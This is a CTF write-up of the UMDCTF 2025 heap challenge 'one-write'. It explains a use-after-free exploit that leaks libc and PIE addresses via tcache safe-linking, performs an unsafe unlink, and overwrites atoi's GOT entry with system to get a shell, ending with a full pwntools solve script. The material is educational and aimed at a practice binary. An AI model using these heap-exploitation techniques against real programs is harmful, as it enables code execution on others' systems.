---
id: 1
title: "UMDCTF 2025 - one-write"
subtitle: "Writeup for the pwn challenge one-write in UMDCTF 2025"
date: "2025.11.26"
tags: "writeups"
---

Back in April, I participated in UMDCTF 2025 with the Singapore Student Merger (SSM). There were a few challenges that I did not manage to solve at the time, and pwn/one-write was one of them. This is a writeup of my upsolve of the challenge.

## Challenge Protections

```
[*] '/home/nikolawinata/Documents/ctf/umdctf/UMDCTF2025/pwn/one-write/one_write'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

Partial RELRO indicates the GOT is writable, but since PIE is enabled we will need a leak of a pointer into the ELF binary.

## Challenge  

```c
char *the_chunk = NULL;
char *chunks[NUM_CHUNKS] = {0};

void write_chunk(void) {
    my_print("data: ");
    read(STDIN_FILENO, the_chunk, THE_CHUNK_SIZE);
}

void read_chunk(void) {
    write(STDOUT_FILENO, the_chunk, THE_CHUNK_SIZE);
}

int main(void) {
    the_chunk = malloc(THE_CHUNK_SIZE);
    free(the_chunk);

    while (1) {
        switch (prompt()) {
        case 1:
            alloc_chunk();
            break;
        case 2:
            free_chunk();
            break;
        case 3:
            write_chunk();
            break;
        case 4:
            read_chunk();
            break;
        default:
            _exit(1);
            break;
        }
    }
}

``` 

All writes and reads are only from a fixed heap address, `the_chunk`. `the_chunk` is allocated at the start of the program and subsequently free, consolidating with the top chunk. 

```c
void alloc_chunk(void) {
    my_print("idx: ");
    uint32_t idx = get_int();
    if (idx >= NUM_CHUNKS)
        _exit(1);

    my_print("size: ");
    uint32_t size = get_int();
    if (size >= 0x600)
        _exit(1);

    chunks[idx] = malloc(size);

    my_print("done!\n");
    my_print("...what? did you think you would get a write?\n");
}

void free_chunk(void) {
    my_print("idx: ");
    uint32_t idx = get_int();
    if (idx >= NUM_CHUNKS)
        _exit(1);

    free(chunks[idx]);
}
```

We are still given malloc and free of sizes up to 0x600.

## Solve Process

Since we only have read and write from a fixed heap address, this means we do not have a very flexible arbitrary read and arbitrary write primitive even with an arbitrary allocation. However, since `the_chunk` is not nulled out after freeing, we have a UAF, giving us a read and heap overflow over overlapping chunks within the 0x600 range of `the_chunk`.

Since we have a heap overflow over allocated chunks, a plausible attack strategy would be to:

1. Get leaks first (LIBC, ELF)
2. Perform a unsafe unlink to write to the global `the_chunk` pointer, allowing us to control where to write afterwards.

Since Partial RELRO is enabled, we can overwrite the GOT entry of `atoi()` with `system()` so that we may enter `/bin/sh` into the options field at the start of the loop in `main()` to pop a shell.

With our attack strategy, we must now first figure out how to get leaks.

### Leaking LIBC

We will first allocate a chunk within unsorted range to perform a LIBC leak and to use for our unsafe unlink attack later on. Allocating a guard chunk and then freeing this unsorted bin chunk:

```python
alloc(0, 0x430-8)
alloc(1, 0x20-8)
free(0)

libc.address = u64(show()[:8]) - libc.sym.main_arena - 96
log.info("libc.address, %#x", libc.address)
```

Viewing from `the_chunk` will then give us the address of `main_arena` and thus LIBC's base address. This was trivial enough, now, how do we get a PIE leak with just LIBC knowledge?

### Leaking ELF

Given LIBC, we can also calculate the LD linker's base address (due to `mmap()` placing chunks at constant offsets).

There are multiple places within the memory region of the process where we can find pointers to the ELF memory region. In fact, in LD:

```
gef> scan ld one_write
[+] Searching for addresses in 'ld' that point to 'one_write'
ld-linux-x86-64.so.2: 0x00007ffff7ffb2a0 <_dlfo_main>  ->  0x0000555555554000  ->  0x00010102464c457f
ld-linux-x86-64.so.2: 0x00007ffff7ffb2a8 <_dlfo_main+0x8>  ->  0x00005555555583c0  ->  0x0000000000000000
ld-linux-x86-64.so.2: 0x00007ffff7ffb2b8 <_dlfo_main+0x18>  ->  0x0000555555556088 <__GNU_EH_FRAME_HDR>  ->  0x0000005c3b031b01
gef>
```

In particular, there is an LD pointer according to Nick Gregory's [Pivoting Around Memory](https://nickgregory.me/post/2019/04/06/pivoting-around-memory/) called `_dl_rtld_libname->name` that exposes an ELF pointer:

```
gef> p _dl_rtld_libname->name
$1 = 0x5555555543b4 "/lib64/ld-linux-x86-64.so.2"
gef> p &_dl_rtld_libname
$2 = (struct libname_list *) 0x7ffff7ffe580 <_dl_rtld_libname>
gef>
```

Now that we know where we can find an ELF address, the next challenge is reading that address. 

Since our read is limited only to the 0x600 range within `the_chunk`, we cannot simply tcache poison and arballoc to the LD pointer to our ELF address. Instead, we will need to somehow "transport" that value to a region within that 0x600 range.

To do this, we can exploit the Tcache's linked list mechanism.

#### A Recap On Tcache's Linked List Mechanism

When chunks within the Tcache's size range are freed into their corresponding Tcachebin, the chunk is converted into a `struct tcache_entry` with the following fields:

```c
struct tcache_entry {
    struct tcache_entry *next; // 8 bytes
    uintptr_t key;             // 8 bytes 
}
```

In effect, subsequent chunks freed into the Tcache freelist form a linear linked list:

```
tcachebins[idx=0, size=0x20, @0x555555559090]: fd=0x5555555596d0 count=3
 -> Chunk(base=0x5555555596c0, addr=0x5555555596d0, size=0x20, flags=PREV_INUSE, fd=0x55500000c3a9(=0x5555555596f0))
 -> Chunk(base=0x5555555596e0, addr=0x5555555596f0, size=0x20, flags=PREV_INUSE, fd=0x55500000c249(=0x555555559710))
 -> Chunk(base=0x555555559700, addr=0x555555559710, size=0x20, flags=PREV_INUSE, fd=0x000555555559(=0x000000000000))
[+] Found 3 valid chunks in tcache
```

When put into the Tcache, the address in the bin's linked list head is mangled with safelinking, which uses `PROTECT_PTR(chunk, head)`. This mangled value is then placed in the `struct tcache_entry *next` field of the new freed chunk, and then linked from the head of the linked list.

```c
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

Currently, the linked list with three chunks looks like this:

```c
// chunk1 -> chunk2 -> chunk3
chunk1->next = (chunk1 >> 12) ^ chunk2;
chunk2->next = (chunk2 >> 12) ^ chunk3;
chunk3->next = (chunk3 >> 12) ^ NULL;
```

Suppose we hijack the `next` field of chunk1 with a UAF or heap overflow primitive with a properly mangled pointer to our target pointer, the LD pointer with the ELF address. Now, the linked list will look like this:

```c
// chunk1 -> _dl_rtld_libname -> (_dl_rtld_libname >> 12) ^ ELF_ADDRESS
chunk1->next = (chunk1 >> 12) ^ &(_dl_rtld_libname->name);
&(_dl_rtld_libname->name).next = ELF_ADDRESS ^ (_dl_rtld_libname >> 12);
```

Now, Tcache thinks `ELF_ADDRESS` is the mangled next field of `_dl_rtld_libname->name` and hence thinks `REVEAL_PTR(ELF_ADDRESS)` is the third chunk in the tcachebin.

Notice that because the chunks are in a linked list, the address of the next chunk is __encoded__ in the current chunk through safelinking. In other words, given

```c
chunk1->next = VALUE = (chunk1 >> 12) ^ actual
actual = VALUE ^ (chunk1 >> 12)
```

Our goal is to get our victim chunk to point directly to our mangled ELF address value so that we may reverse the safelinking encryption and calculate the actual ELF address.

We do this by invoking `malloc()` to take out the first two chunks in the linked list, and then finally `free()` our victim chunk so that we may achieve:

```c
// victim -> (_dl_rtld_libname >> 12) ^ ELF_ADDRESS
victim.next = (victim >> 12) ^ (_dl_rtld_libname >> 12) ^ ELF_ADDRESS;
```

Then, we calculate `ELF_ADDRESS` as:

```c
ELF_ADDRESS = victim.next ^ (victim >> 12) ^ (_dl_rtld_libname >> 12)
```

We can implement this in the solve script as such:

```python
alloc(0, 0x430-8)

alloc(4, 0x20-8)
alloc(5, 0x20-8)
free(1)
mangle = u64(show()[0x430:0x430+8])
log.info("mangle, %#x", mangle)

alloc(3, 0x20-8)
free(5)
free(4)
free(3) # 3 chunks in tcachebin
p.interactive()

ld.address = libc.address + 0x212000
log.info("ld.address, %#x", ld.address)

# ld's _dl_rtld_libname->name
write(b'\0' * 0x420 + p64(0x430) + p64(0x21) + p64(mangle ^ (ld.address + 0x37580))) 

alloc(3, 0x20-8)
alloc(4, 0x20-8)
free(3)

mangled = u64(show()[0x430:0x430+8])

leak = mangled ^ mangle ^ ((ld.address + 0x37580) >> 12)
elf.address = leak - 0x3b4
log.info("elf.address, %#x", elf.address)
```

Now that we have an ELF address, we can bypass PIE and calculate the ELF's base address. We have all the information we need now to carry out an unsafe unlink write attack now.

### Writing To `the_chunk`

To do this attack, we will need two unsorted size chunks. The strategy is to:

1. Corrupt the size header of the chunk right after our unsorted chunk at `the_chunk`,
2. Modify the size header to be an aligned unsorted size
3. Free the chunk after, and reclaim with the new size so that we have full control of this chunk.
4. Use the heap overflow from `the_chunk` to forge a fake unsorted chunk of `original_size-0x10` within `the_chunk` and modified `fd` and `bk` pointers
5. Use that same overflow to modify the size headers of the next chunk to be valid for consolidation with our fake chunk

After we have our two adjacent unsorted chunks, everything else is a [textbook unsafe unlink write](https://github.com/shellphish/how2heap/blob/master/glibc_2.41/unsafe_unlink.c).

Let's implement that in the solve script:

```python
chunk_ptr = elf.address + 0x4080

alloc(7, 0x100)
alloc(7, 0x100)
alloc(7, 0x100)
alloc(7, 0x100)
alloc(8, 0x20)

write(flat({
    0x420: [0x430, 0x4a1],
}, filler=b'\0')) # Corrupt size header, overlap the other chunks so we have a second unsorted chunk

free(1)

alloc(8, 0x4a0-0x10)

write(flat({
    0x0: [0, 0x421, chunk_ptr-0x18, chunk_ptr-0x10],
    0x420: [0x420, 0x4a0],
}, filler=b'\0')) # Forge fake chunk to prepare for unlink write

free(8) # Write is performed
```

We can overwrite the `the_chunk` pointer with the address of the GOT entry for `atoi`, overwrite it with `system()` and thus get our shell:

```python
write(p64(0)*3 + p64(elf.got.atoi))
write(p64(libc.sym.system))

p.sendlineafter(b'> ', b'sh')

p.interactive()
```

## Full Solve Script

```python
from pwn import *

elf = context.binary = ELF("./one_write")
libc = elf.libc
ld = ELF("/usr/lib64/ld-linux-x86-64.so.2")
context.log_level = 'debug'
context.terminal = ['kitty', '-e']

p = process()
gdb.attach(p)

def alloc(idx, size):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def write(content):
    p.sendlineafter(b'> ', b'3')
    p.sendafter(b'data: ', content)

def show():
    p.sendlineafter(b'> ', b'4')
    return p.recv(0x600-8)

alloc(0, 0x430-8)
alloc(1, 0x20-8)
free(0)

libc.address = u64(show()[:8]) - libc.sym.main_arena - 96
log.info("libc.address, %#x", libc.address)

alloc(0, 0x430-8)

alloc(4, 0x20-8)
alloc(5, 0x20-8)
free(1)
mangle = u64(show()[0x430:0x430+8])
log.info("mangle, %#x", mangle)

alloc(3, 0x20-8)
free(5)
free(4)
free(3)
p.interactive()

ld.address = libc.address + 0x212000
log.info("ld.address, %#x", ld.address)

write(b'\0' * 0x420 + p64(0x430) + p64(0x21) + p64(mangle ^ (ld.address + 0x37580))) # ld's _dl_rtld_libname->name

alloc(3, 0x20-8)
alloc(4, 0x20-8)
free(3)

mangled = u64(show()[0x430:0x430+8])

leak = mangled ^ mangle ^ ((ld.address + 0x37580) >> 12)
elf.address = leak - 0x3b4
log.info("elf.address, %#x", elf.address)
alloc(5, 0x20-8)

# alloc(0, 0x300-0x10)
chunk_ptr = elf.address + 0x4080

alloc(7, 0x100)
alloc(7, 0x100)
alloc(7, 0x100)
alloc(7, 0x100)
alloc(8, 0x20)

write(flat({
    0x420: [0x430, 0x4a1],
}, filler=b'\0'))

free(1)

alloc(8, 0x4a0-0x10)

write(flat({
    0x0: [0, 0x421, chunk_ptr-0x18, chunk_ptr-0x10],
    0x420: [0x420, 0x4a0],
}, filler=b'\0'))

free(8)

write(p64(0)*3 + p64(elf.got.atoi))
write(p64(libc.sym.system))

p.sendlineafter(b'> ', b'sh')

p.interactive()
```
